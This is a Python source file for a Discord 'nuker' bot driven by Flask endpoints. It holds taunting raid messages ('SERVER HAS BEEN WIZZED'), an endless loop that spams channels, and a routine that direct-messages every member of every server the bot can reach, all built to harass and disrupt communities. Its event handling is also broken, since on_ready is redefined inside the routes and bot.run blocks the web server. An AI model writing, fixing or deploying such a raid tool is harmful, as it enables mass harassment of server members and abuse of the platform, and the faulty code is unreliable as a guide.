from flask import Flask, request
import discord
import asyncio
import os

app = Flask(__name__)

intents = discord.Intents.default()
intents.members = True
bot = discord.Client(intents=intents)

###########SETUP###############
prefix = "?"  # Placeholder, replace with your desired prefix
token = "token"  # Replace 'TOKEN' with your actual bot token
spam_messages = "SERVER HAS BEEN WIZZED BY QUAKIFIER @here"  # Replace with your spam message
massdm = "THIS SERVER HAS BEEN WIZZED YOU CLOWNS !"  # Replace with your mass DM message
rolenames = "NUKED BY QUALIFIER"  # Replace with the role names you want to spam
channels = "NUKED BY QUALIFIER"  # Replace with the channel names you want to spam
##############################

def Clear():
    os.system('cls' if os.name == 'nt' else 'clear')


@app.route('/spam', methods=['POST'])
def spam():
    # Assuming spam_messages and channels are defined somewhere
    data = request.json
    spam_messages = data.get('spam_messages', [])
    channels = data.get('channels', [])

    @bot.event
    async def on_ready():
        Clear()
        print("Bot is now spamming!")

        while True:
            for channel in channels:
                await bot.get_channel(channel).send(spam_messages)

    return 'Spamming initiated'


@bot.event
async def on_ready():
    Clear()
    print("Bot is online")


@app.route('/massdm', methods=['POST'])
def mass_dm():
    data = request.json
    message = data.get('message', massdm)

    @bot.event
    async def on_ready():
        Clear()
        print("Bot is now mass DMing!")

        for guild in bot.guilds:
            for member in guild.members:
                try:
                    await member.send(message)
                except Exception as e:
                    print(f"Failed to send DM to {member}: {e}")

    return 'Mass DM initiated'


bot.run(token)

if __name__ == '__main__':
    app.run(debug=True)
